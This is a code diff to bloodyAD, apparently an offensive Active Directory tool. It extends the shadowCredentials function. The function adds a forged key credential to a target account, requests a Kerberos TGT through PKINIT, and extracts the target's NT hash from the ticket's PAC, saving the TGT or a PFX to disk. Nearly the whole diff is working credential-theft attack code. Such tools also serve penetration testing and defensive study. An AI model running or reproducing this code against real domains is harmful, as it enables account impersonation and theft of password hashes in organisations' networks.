@@ -1,15 +1,17 @@
-import binascii, datetime, random, string
+import binascii, datetime, random, string, base64
 from typing import Literal
+from urllib import parse
 from bloodyAD import utils
 from bloodyAD.exceptions import LOG
 from bloodyAD.formatters import accesscontrol, common, cryptography, dns
 from bloodyAD.network.ldap import Change, Scope
+from bloodyAD.exceptions import BloodyError
 import msldap
 from cryptography import x509
-from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
-from bloodyAD.exceptions import BloodyError
+from minikerberos.common import factory
+from minikerberos.protocol.external import ticketutil
 
 
 def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
@@ -287,27 +289,30 @@ def rbcd(conn, target: str, service: str):
 
 def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     """
-    Add Key Credentials to target, used to impersonate target with added credentials
+    Add Key Credentials to target, and use those credentials to retrieve a TGT and a NT hash using PKINIT.
 
     :param target: sAMAccountName, DN, GUID or SID of the target
-    :param path: filepath for the generated Key Credentials certificate
+    :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
     """
-    if path == "CurrentPath":
-        path = None
 
-    target_dn = conn.ldap.dnResolver(target)
+    target_dn = None
+    target_sAMAccountName = None
+    for entry in conn.ldap.bloodysearch(target, attr=["distinguishedName", "sAMAccountName"]):
+        target_dn = entry["distinguishedName"]
+        target_sAMAccountName = entry["sAMAccountName"]
+    if path == "CurrentPath":
+        path = target_sAMAccountName + "_" + "".join(
+            random.choice(string.ascii_letters + string.digits) for i in range(2)
+        )
+
     LOG.debug("[*] Generating certificate")
 
     key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    issuer = x509.Name(
-        [
-            x509.NameAttribute(NameOID.COMMON_NAME, target_dn),
-        ]
-    )
+    subject = x509.Name.from_rfc4514_string(target_dn)
     cert = (
         x509.CertificateBuilder()
-        .subject_name(issuer)
-        .issuer_name(issuer)
+        .subject_name(subject)
+        .issuer_name(subject)
         .serial_number(x509.random_serial_number())
         .public_key(key.public_key())
         .not_valid_before(datetime.datetime.utcnow())
@@ -315,7 +320,6 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
         .sign(key, hashes.SHA256())
     )
 
-    LOG.debug("[+] Certificate generated")
     LOG.debug("[*] Generating KeyCredential")
 
     keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
@@ -336,37 +340,38 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     )
 
     LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
-    if not path:
-        path = "".join(
-            random.choice(string.ascii_letters + string.digits) for i in range(8)
-        )
-        LOG.info(
-            "No outfile path was provided. The certificate(s) will be"
-            " stored with the filename: %s" % path
-        )
 
-    key_path = path + "_priv.pem"
-    with open(key_path, "wb") as f:
-        f.write(
-            key.private_bytes(
-                serialization.Encoding.PEM,
-                serialization.PrivateFormat.TraditionalOpenSSL,
-                serialization.NoEncryption(),
-            )
-        )
-    cert_path = path + "_cert.pem"
-    with open(cert_path, "wb") as f:
-        f.write(cert.public_bytes(serialization.Encoding.PEM))
-
-    # TODO: Generate TGT on the fly
-    LOG.info("[+] Saved PEM certificate at path: %s" % cert_path)
-    LOG.info("[+] Saved PEM private key at path: %s" % key_path)
-    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
-    LOG.info("Run the following command to obtain a TGT:")
-    LOG.info(
-        "python3 PKINITtools/gettgtpkinit.py -cert-pem %s -key-pem %s %s/%s %s.ccache"
-        % (cert_path, key_path, conn.conf.domain, target, path)
+    pfx = serialization.pkcs12.serialize_key_and_certificates(
+        name=target_dn.encode(),
+        key=key,
+        cert=cert,
+        cas=None,
+        encryption_algorithm=serialization.NoEncryption(),
     )
+    pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")
+
+    client = None
+    try:
+        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}"
+        cu = factory.KerberosClientFactory.from_url(url)
+        client = cu.get_client_blocking()
+        tgs, enctgs, key, decticket = client.U2U()
+    except Exception as e:
+        pfx_path = path + ".pfx"
+        with open(pfx_path, "wb") as f:
+            f.write(pfx)
+        LOG.error(f"[-] PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
+        LOG.info(f"[+] PKINIT PFX certificate saved at: %s" % pfx_path)
+        raise e
+    finally:
+        if client and client.kerberos_TGT:
+            ccache_path = path + ".ccache"
+            client.ccache.to_file(path + ".ccache")
+            LOG.info('[+] TGT stored in ccache file %s' % ccache_path)
+    
+    return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]
+
+            
 
 
 def uac(conn, target: str, f: list = None):
